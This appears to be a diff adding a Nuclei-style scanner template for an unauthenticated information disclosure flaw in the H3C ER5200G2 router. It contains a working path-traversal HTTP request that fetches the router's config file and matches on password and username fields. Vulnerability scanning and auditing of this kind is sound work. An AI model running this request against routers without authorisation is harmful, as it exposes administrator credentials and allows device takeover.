@@ -1,0 +1,32 @@
+id: H3C-ER5200G2-Information-disclosure
+
+info:
+  name: H3C ER5200G2路由器 信息泄露漏洞
+  author: unknown
+  severity: high
+  description: |-
+    Hunter: app.name="H3C Router Management"
+    H3C ER5200G2路由器 存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取后台账号密码等敏感信息，从而登录后台，使系统处于极不安全的状态。
+
+  tags: Information disclosure
+
+http:
+  - raw:
+      - |
+        GET /userLogin.asp/../actionpolicy_status/../ER5200G2.cfg HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "vtypasswd="
+          - "vtypasswdtype="
+          - "vtyname="
+          - "H3C"
+        condition: and
+      - type: status
+        status: 
+          - 200
